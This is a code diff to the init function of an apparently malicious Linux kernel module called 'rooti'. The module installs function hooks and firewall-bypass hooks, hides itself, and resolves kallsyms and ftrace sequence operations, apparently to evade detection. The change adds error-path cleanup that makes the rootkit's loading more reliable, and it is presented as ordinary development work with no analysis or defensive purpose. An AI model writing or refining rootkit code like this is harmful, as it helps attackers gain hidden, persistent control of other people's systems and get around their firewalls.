@@ -354,19 +354,21 @@ static int __init rooti_init(void)
     err = rooti_install_func_hooks(rooti_func_hooks, ARRAY_SIZE(rooti_func_hooks));
     if (err) {
         ROOTI_DEBUG("rooti_install_func_hooks() failed: %d", err);
-        return err;
+        goto error_install_func_hooks;
     }
 
     err = rooti_install_fw_bypass_hooks();
     if (err) {
         ROOTI_DEBUG("rooti_install_fw_bypass_hooks() failed: %d", err);
-        return err;
+        goto error_install_fw_hooks;
     }
 
 #ifndef ROOTI_DEBUG_SHOWME
     err = rooti_hideme();
-    if (err)
-        return err;
+    if (err) {
+        ROOTI_DEBUG("rooti_hideme() failed: %d", err);
+        goto error_hideme;
+    }
 
     ROOTI_RESOLVE_SYM_ADDR(struct seq_operations *, kallsyms_op, -ENOENT);
     ROOTI_RESOLVE_SYM_ADDR(struct seq_operations *, show_ftrace_seq_ops, -ENOENT);
@@ -383,6 +385,15 @@ static int __init rooti_init(void)
     ROOTI_DEBUG("init");
 
     return 0;
+
+#ifndef ROOTI_DEBUG_SHOWME
+error_hideme:
+    rooti_uninstall_fw_bypass_hooks();
+#endif
+error_install_fw_hooks:
+    rooti_uninstall_func_hooks(rooti_func_hooks, ARRAY_SIZE(rooti_func_hooks));
+error_install_func_hooks:
+    return err;
 }
 
 static void __exit rooti_exit(void)
